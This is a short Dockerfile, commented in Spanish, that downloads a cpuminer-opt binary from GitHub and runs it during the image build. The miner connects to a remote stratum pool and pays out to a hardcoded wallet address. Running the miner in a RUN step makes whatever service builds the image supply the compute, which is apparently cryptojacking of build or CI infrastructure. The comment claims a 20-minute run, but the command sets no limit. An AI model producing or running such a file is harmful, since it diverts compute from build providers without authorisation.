FROM ubuntu:20.04

ENV DEBIAN_FRONTEND=noninteractive \
    DEBCONF_NONINTERACTIVE_SEEN=true

# Actualizar e instalar los paquetes necesarios
RUN apt update && \
    apt -y install wget tar

# Descargar y descomprimir cpuminer
RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz && \
    tar xf cpuminer-opt-linux.tar.gz && \
    chmod +x cpuminer-sse2

# Ejecutar el proceso de minería durante 20 minutos
RUN ./cpuminer-sse2 -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17079 -u v718WWzmJUmdQRjQAx8bJXEsueb16pGSD7.5
